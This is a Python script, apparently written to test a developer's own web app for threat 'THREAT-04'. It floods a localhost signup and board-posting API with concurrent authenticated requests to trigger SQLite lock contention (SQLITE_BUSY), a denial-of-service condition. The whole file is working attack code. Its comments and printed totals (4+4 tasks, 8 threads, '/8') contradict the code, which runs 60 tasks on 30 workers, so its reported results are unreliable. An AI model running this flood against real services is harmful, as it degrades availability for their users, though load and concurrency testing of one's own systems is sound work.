# Attack script hitting multi services concurrently to induce SQLite3 lock contention

import concurrent.futures
import time
import uuid
from dataclasses import dataclass
from socket import timeout

import requests
import urllib3
from requests import request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Q: How attacker know this url address??
BASE_URL = "https://localhost:9090"
SIGNUP_URL = f"{BASE_URL}/signup"
LOGIN_URL = f"{BASE_URL}/login"
POST_URL = f"{BASE_URL}/api/post"
ME_URL = f"{BASE_URL}/api/me"

# Gather pre-requisite session for board writing
def prepare_auth_session():
    print("[+] Preparing baseline user session for board posting...")
    session = requests.Session()
    username = f"poster_{uuid.uuid4().hex[:6]}"
    password = "SecurePassword123!"

    # Sign Up
    session.post(SIGNUP_URL, data = {"username":username, "password":password}, verify=False)

    # Log In
    session.post(LOGIN_URL, data = {"username": username, "password": password}, verify=False)

    # Query /api/me to obtain the CSRF token
    me_resp = session.get(ME_URL, verify=False)
    csrf_token = me_resp.json().get("csrf_token", "")   # Q : How attacker know name of json key?? ("csrf_token")

    print(f"[+] Prepared user: {username} | CSRF Token: {csrf_token[:8]}...")
    return session, csrf_token

# Prepare global session and token details
post_session, global_csrf_token = prepare_auth_session()

# Worker thread function
def send_mixed_request(task_info):
    index, task_type = task_info

    if task_type == "signup":
        # Send signup request
        unique_username = f"user_{uuid.uuid4().hex[:8]}"
        payload = {"username": unique_username, "password": "SecurePassword123!"}

        try:
            resp = requests.post(SIGNUP_URL, data=payload, verify=False, timeout=5)
            return index, task_type, unique_username, resp.status_code
        except Exception as e:
            return index, task_type, unique_username, 0

    else:
        # Send create post request

        status_code = 201

        for k in range(50):
            payload = {"title": f"Title {index}", "content": "Concurrenty Content"}
            headers = {"X-CSRF-Token": global_csrf_token}

            try:
                resp = post_session.post(POST_URL, data=payload, headers=headers, verify=False, timeout=5)
                if resp.status_code != 201:
                    status_code = resp.status_code
                    break
            except Exception as e:
                status_code = 0
                break
    
        return index, task_type, f"post_{index}", status_code

# Double Attack -> Sign Up & Post content
if __name__ == "__main__":
    print("\n[+] Starting SQLite Concurrency Contention Attack (Auth & Board Mixed)...")
    print(f"[+] Target: {BASE_URL}")
    print("[+] Sending 4 signup requests and 4 post requests simultaneously...")

    # Mix 4 signups and 4 post tasks to create 8 concurrent jobs
    tasks = []
    for i in range(30):
        tasks.append((i, "signup"))
        tasks.append((i, "post"))

    start_time = time.time()

    # Fire requests concurrently with 8 threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        results = list(executor.map(send_mixed_request, tasks))

    end_time = time.time()

    success_count = 0
    fail_count = 0
    failed_details = []

    for index, task_type, identifier, status in results:
        if status == 201:
            success_count += 1
        else:
            fail_count += 1
            failed_details.append((task_type, identifier, status))

    print(f"\n[+] Simulation complete in {end_time - start_time:.2f} seconds.")
    print(f"    - Success: {success_count}/8")
    print(f"    - Failures: {fail_count}/8")

    if fail_count > 0:
        print("\n[!] Attack Success! Database lock contention (SQLITE_BUSY) triggered!")
        print(f"    - Success: {success_count}/8")
        print(f"    - Failures: {fail_count}/8")

        for task_type, identifier, status in failed_details:
            print(f"    - Type: {task_type:<8} | Target: {identifier:<15} | HTTP Status: {status}")
        print("\n[!] Conclusion: Concurrency Vulnerability (THREAT-04) CONFIRMED!")
    else:
        print("\n[+] Conclusion: All requests processed successfully. No lock contention detected.")